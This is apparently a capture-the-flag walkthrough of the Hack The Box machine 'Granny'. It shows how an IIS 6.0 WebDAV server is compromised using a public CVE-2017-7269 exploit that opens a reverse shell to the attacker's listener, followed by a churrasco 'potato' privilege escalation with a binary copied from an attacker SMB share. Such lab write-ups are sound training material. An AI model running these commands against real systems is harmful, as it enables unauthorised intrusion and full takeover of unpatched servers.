# Box: Granny
# Level: Easy
# OS: Windows
<hr>

Lets get started

# Recon

## Portscanning

command:```sudo nmap -A 10.129.56.178 -T4  -v -p- ```
```
# Nmap 7.93 scan initiated Thu Sep 21 23:02:51 2023 as: nmap -A -T4 -v -p- -oN granny 10.129.56.178
Nmap scan report for 10.129.56.178
Host is up (0.16s latency).
Not shown: 65534 filtered tcp ports (no-response)
PORT   STATE SERVICE VERSION
80/tcp open  http    Microsoft IIS httpd 6.0
|_http-server-header: Microsoft-IIS/6.0
| http-webdav-scan: 
|   Public Options: OPTIONS, TRACE, GET, HEAD, DELETE, PUT, POST, COPY, MOVE, MKCOL, PROPFIND, PROPPATCH, LOCK, UNLOCK, SEARCH
|   WebDAV type: Unknown
|   Server Date: Thu, 21 Sep 2023 22:08:49 GMT
|   Allowed Methods: OPTIONS, TRACE, GET, HEAD, DELETE, COPY, MOVE, PROPFIND, PROPPATCH, SEARCH, MKCOL, LOCK, UNLOCK
|_  Server Type: Microsoft-IIS/6.0
| http-methods: 
|   Supported Methods: OPTIONS TRACE GET HEAD DELETE COPY MOVE PROPFIND PROPPATCH SEARCH MKCOL LOCK UNLOCK PUT POST
|_  Potentially risky methods: TRACE DELETE COPY MOVE PROPFIND PROPPATCH SEARCH MKCOL LOCK UNLOCK PUT
|_http-title: Under Construction
Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
Device type: general purpose
Running (JUST GUESSING): Microsoft Windows 2003|2008|XP|2000 (92%)
OS CPE: cpe:/o:microsoft:windows_server_2003::sp1 cpe:/o:microsoft:windows_server_2003::sp2 cpe:/o:microsoft:windows_server_2008::sp2 cpe:/o:microsoft:windows_xp::sp3 cpe:/o:microsoft:windows_2000::sp4
Aggressive OS guesses: Microsoft Windows Server 2003 SP1 or SP2 (92%), Microsoft Windows Server 2008 Enterprise SP2 (92%), Microsoft Windows Server 2003 SP2 (91%), Microsoft Windows 2003 SP2 (91%), Microsoft Windows XP SP3 (90%), Microsoft Windows 2000 SP4 or Windows XP Professional SP1 (90%), Microsoft Windows XP (87%), Microsoft Windows Server 2003 SP1 - SP2 (86%), Microsoft Windows XP SP2 or Windows Server 2003 (86%), Microsoft Windows XP SP2 or SP3 (85%)
No exact OS matches for host (test conditions non-ideal).
Network Distance: 2 hops
TCP Sequence Prediction: Difficulty=261 (Good luck!)
IP ID Sequence Generation: Incremental
Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows

TRACEROUTE (using port 80/tcp)
HOP RTT       ADDRESS
1   177.17 ms 10.10.14.1
2   177.19 ms 10.129.56.178

Read data files from: /usr/bin/../share/nmap
OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
# Nmap done at Thu Sep 21 23:08:58 2023 -- 1 IP address (1 host up) scanned in 367.26 seconds
```
From our scan we have just 1 open port. This means our enumeration today will be focused on that port.


# Enumeration

Navigate to the webpage

![image](https://github.com/BlackAnon22/BlackAnon22.github.io/assets/67879936/c4f47ac1-feea-4966-a454-ede3966703b7)

There was nothing interesting in the page source. 

Going back to the nmap scan I found this

![image](https://github.com/BlackAnon22/BlackAnon22.github.io/assets/67879936/fc2f91f1-71df-4da5-b830-9e5274c94f20)

It seems that version of ```Microsoft IIS httpd``` has an exploit

![image](https://github.com/BlackAnon22/BlackAnon22.github.io/assets/67879936/9dd310ad-45ad-4604-9992-4f5561b5a543)

Yeah I was right. Now that we found our attack vector, lets exploit😎



# Exploitation

During the search for exploits I found [this](https://github.com/g0rx/iis6-exploit-2017-CVE-2017-7269)

You can just clone it, so you'll be able to use  it

```
┌──(bl4ck4non㉿bl4ck4non)-[~/Downloads/HTB/Granny]
└─$ git clone https://github.com/g0rx/iis6-exploit-2017-CVE-2017-7269.git
Cloning into 'iis6-exploit-2017-CVE-2017-7269'...
remote: Enumerating objects: 6, done.
remote: Total 6 (delta 0), reused 0 (delta 0), pack-reused 6
Receiving objects: 100% (6/6), done.
                                                                                                                                                                                                
┌──(bl4ck4non㉿bl4ck4non)-[~/Downloads/HTB/Granny]
└─$ cd iis6-exploit-2017-CVE-2017-7269 
                                                                                                                                                                                                
┌──(bl4ck4non㉿bl4ck4non)-[~/Downloads/HTB/Granny/iis6-exploit-2017-CVE-2017-7269]
└─$ ls -la         
total 32
drwxr-xr-x 3 bl4ck4non bl4ck4non  4096 Sep 20 17:15  .
drwxr-xr-x 3 bl4ck4non bl4ck4non  4096 Sep 20 17:15  ..
drwxr-xr-x 8 bl4ck4non bl4ck4non  4096 Sep 20 17:15  .git
-rw-r--r-- 1 bl4ck4non bl4ck4non 12313 Sep 20 17:15 'iis6 reverse shell'
-rw-r--r-- 1 bl4ck4non bl4ck4non    66 Sep 20 17:15  README.md
```
Lets try to run the exploit

```
┌──(bl4ck4non㉿bl4ck4non)-[~/Downloads/HTB/Granny/iis6-exploit-2017-CVE-2017-7269]
└─$ python2 iis6\ reverse\ shell             
usage:iis6webdav.py targetip targetport reverseip reverseport
```
So, we have to specify the targetip and targetport, also our tun0 ip address and the port we plan on listening on

Lets start out by setting up our netcat listener

![image](https://github.com/BlackAnon22/BlackAnon22.github.io/assets/67879936/8f60c83d-2047-433b-8acc-59c5258cf23e)

Now, lets run the exploit

command:```python2 iis6\ reverse\ shell 10.129.127.13 80 10.10.14.142 1234```

![image](https://github.com/BlackAnon22/BlackAnon22.github.io/assets/67879936/0f073bc7-316c-4f62-820c-d68f28347e0c)

Checking our netcat listener,

![image](https://github.com/BlackAnon22/BlackAnon22.github.io/assets/67879936/ebd2bbd1-f8e2-4d49-b4e7-09083381a065)

We got a shell as ```nt authority\network service```. Lets go ahead and escalate our privileges



# Privilege Escalation

Running the ```whoami /priv``` command

![image](https://github.com/BlackAnon22/BlackAnon22.github.io/assets/67879936/7da53b57-00cb-4f45-9252-2ca1f64aa520)

As we can see ```SeImpersonatePrivilege``` is enabaled, so this may be vulnerable to a potato exploit.

We can try [churrasco](https://github.com/Re4son/Churrasco/blob/master/churrasco.exe) here

We'll  be transferring that to the target machine, now ```certutil``` and ```curl``` doesn't work on the target machine. This means we'll be sending the file over to the target using smb

Run this command in the directory where you downloaded the file

command:```smbserver.py share .```

![image](https://github.com/BlackAnon22/BlackAnon22.github.io/assets/67879936/3dfc98ea-9007-41de-9165-a04fa37ef439)

On the target machine,

command:```copy \\10.10.14.142\share\churrasco.exe potato.exe```

![image](https://github.com/BlackAnon22/BlackAnon22.github.io/assets/67879936/49bfec61-3a3d-4677-9ed1-d82bd2391f95)

Now that we've successfully transferred the executable, lets run it

command:```potato.exe -d "cmd.exe"```

![image](https://github.com/BlackAnon22/BlackAnon22.github.io/assets/67879936/ff84d8d1-8e83-4dbc-adcc-5607fd09bb65)

We have successfully escalated our privileges, which means we have successfully pwned this box😎


That will be all for today
<br> <br>
[Back To Home](../../index.md)










